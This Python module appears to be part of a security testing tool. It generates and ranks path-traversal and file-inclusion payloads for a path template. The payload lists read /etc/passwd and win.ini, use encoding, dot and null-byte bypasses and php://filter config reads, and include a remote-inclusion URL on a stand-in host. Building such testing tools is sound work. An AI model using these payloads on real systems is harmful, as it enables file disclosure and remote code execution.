"""Path traversal / LFI payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_path_context

# The input is the whole path: absolute paths, wrappers, and remote schemes.
_FULL_BODIES = [
    ("/etc/passwd", "absolute-unix"),
    ("../../../../etc/passwd", "traversal"),
    ("php://filter/convert.base64-encode/resource=index.php", "php-filter"),
    ("http://evil.example.com/shell.txt", "remote-rfi"),
    ("C:\\windows\\win.ini", "absolute-windows"),
]

# The input is appended under a base directory: climb out with traversal.
_BASE_BODIES = [
    ("../../../../etc/passwd", "traversal"),
    ("..%2f..%2f..%2fetc%2fpasswd", "encoded-traversal"),
    ("....//....//....//etc/passwd", "dot-bypass"),
    ("/etc/passwd", "absolute"),
    ("php://filter/convert.base64-encode/resource=config.php", "php-filter"),
]

# A fixed suffix follows the input: use a null byte to bypass the extension.
_EXT_BODIES = [
    ("../../../../etc/passwd%00", "traversal-nullbyte"),
    ("../../../../etc/passwd", "traversal"),
    ("/etc/passwd%00", "absolute-nullbyte"),
    ("php://filter/convert.base64-encode/resource=index", "php-filter"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class PathCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class PathMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[PathCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    return {
        Context.PATH_FULL: _FULL_BODIES,
        Context.PATH_BASE: _BASE_BODIES,
        Context.PATH_EXT: _EXT_BODIES,
    }.get(context, _BASE_BODIES)


def mutate_path(template: str) -> PathMutationResult:
    """Generate and rank path-traversal payloads for ``template``."""
    from .analyzer import analyze_path

    context = analyze_path_context(template)
    generated = _bodies(context)

    candidates: list[PathCandidate] = []
    for payload, strategy in generated:
        result = analyze_path(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                PathCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return PathMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
